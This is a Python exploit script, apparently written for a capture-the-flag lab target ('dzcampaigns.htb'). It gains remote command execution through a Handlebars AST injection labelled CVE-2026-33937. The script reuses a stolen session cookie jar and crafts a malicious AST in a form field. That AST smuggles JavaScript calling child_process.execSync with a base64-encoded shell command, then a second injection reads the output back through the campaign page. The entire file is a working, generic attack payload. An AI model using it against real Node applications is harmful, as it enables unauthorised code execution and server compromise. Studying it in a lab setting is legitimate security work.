#!/usr/bin/env python3
"""Handlebars 4.7.8 AST RCE (CVE-2026-33937) for DarkZero Campaigns.

Needs: logged-in cookie jar at loot/auth-ania.txt (or set JAR).
  python3 ast_rce.py 'id'
  python3 ast_rce.py --cmd 'cat /etc/hostname'
"""
import base64, html as html_lib, json, random, re, subprocess, sys, time
from pathlib import Path

BASE = "http://10.129.50.138"
HOST = "dzcampaigns.htb"
JAR = str(Path(__file__).resolve().parents[1] / "loot" / "auth-ania.txt")
OUTF = "/opt/DarkZero_Campaigns/rlast.txt"

def csrf():
    subprocess.run(["curl","-sS","-b",JAR,"-c",JAR,"-H",f"Host: {HOST}",
                    f"{BASE}/character/new","-o","/tmp/pg.html","--max-time","15"], check=False)
    h = open("/tmp/pg.html").read()
    m = re.search(r'name="_csrf"\s+value="([^"]+)"', h)
    if not m:
        raise SystemExit("no csrf / not logged in")
    return m.group(1)

def make_ast(js_expr: str):
    return {
        "type": "Program",
        "body": [{
            "type": "MustacheStatement",
            "path": {"type": "PathExpression", "data": False, "depth": 0,
                     "parts": ["lookup"], "original": "lookup", "loc": None},
            "params": [
                {"type": "PathExpression", "data": False, "depth": 0,
                 "parts": [], "original": "this", "loc": None},
                {"type": "NumberLiteral", "value": js_expr, "original": 1, "loc": None},
            ],
            "escaped": True,
            "strip": {"open": False, "close": False},
            "loc": None,
        }],
        "strip": {},
        "loc": None,
    }

def rce(cmd: str) -> str:
    # write stdout/stderr to OUTF then return short OK + size via campaign
    shell = f"({cmd}) >{OUTF} 2>&1; echo RC:$?; wc -c {OUTF}"
    b64 = base64.b64encode(shell.encode()).decode()
    js = ('{},{})) + process.mainModule.require("child_process")'
          f'.execSync(Buffer.from("{b64}","base64").toString()).toString() //')
    t = csrf()
    body = {
        "name": f"r{int(time.time())%999999}",
        "race": "E", "class": "M", "backstory": "b", "campaign_id": 1,
        "campaign_message": make_ast(js),
    }
    Path("/tmp/body.json").write_text(json.dumps(body))
    subprocess.run([
        "curl","-sS","-b",JAR,"-c",JAR,"-H",f"Host: {HOST}",
        "-X","POST",f"{BASE}/character",
        "-H","Content-Type: application/json","-H",f"X-CSRF-Token: {t}",
        "--data-binary","@/tmp/body.json","-o","/tmp/post.out","--max-time","90",
    ], check=False)
    time.sleep(0.5)
    # second RCE: just cat OUTF (smaller path via same bug writing to camp + file)
    # Use simple base64 of file into campaign - split if large
    shell2 = f"base64 -w0 {OUTF} | head -c 12000; echo"
    b642 = base64.b64encode(shell2.encode()).decode()
    js2 = ('{},{})) + process.mainModule.require("child_process")'
           f'.execSync(Buffer.from("{b642}","base64").toString()).toString() //')
    t = csrf()
    tag = f"B64{random.randint(10000,99999)}"
    body2 = {
        "name": f"c{int(time.time())%999999}",
        "race": "E", "class": "M", "backstory": "b", "campaign_id": 1,
        "campaign_message": make_ast(js2),
    }
    Path("/tmp/body.json").write_text(json.dumps(body2))
    subprocess.run([
        "curl","-sS","-b",JAR,"-c",JAR,"-H",f"Host: {HOST}",
        "-X","POST",f"{BASE}/character",
        "-H","Content-Type: application/json","-H",f"X-CSRF-Token: {t}",
        "--data-binary","@/tmp/body.json","-o","/tmp/post.out","--max-time","60",
    ], check=False)
    time.sleep(0.6)
    camp = subprocess.check_output(
        ["curl","-sS","-H",f"Host: {HOST}",f"{BASE}/campaign/1","--max-time","25"], text=True)
    msgs = [html_lib.unescape(m) for m in re.findall(r"<p>([^<]+)</p>", camp)]
    # last msg that looks like base64-ish (long alnum)
    for m in reversed(msgs):
        if "joined the campaign" in m or "Chronicle" in m:
            continue
        s = m.strip().replace("\n", "")
        # try decode
        try:
            # strip non-b64
            s2 = re.sub(r"[^A-Za-z0-9+/=]", "", s)
            if len(s2) < 8:
                return m
            pad = (-len(s2)) % 4
            data = base64.b64decode(s2 + "=" * pad)
            return data.decode("utf-8", "replace")
        except Exception:
            return m
    return ""

if __name__ == "__main__":
    cmd = " ".join(sys.argv[1:]) if len(sys.argv) > 1 else "id"
    print(rce(cmd))
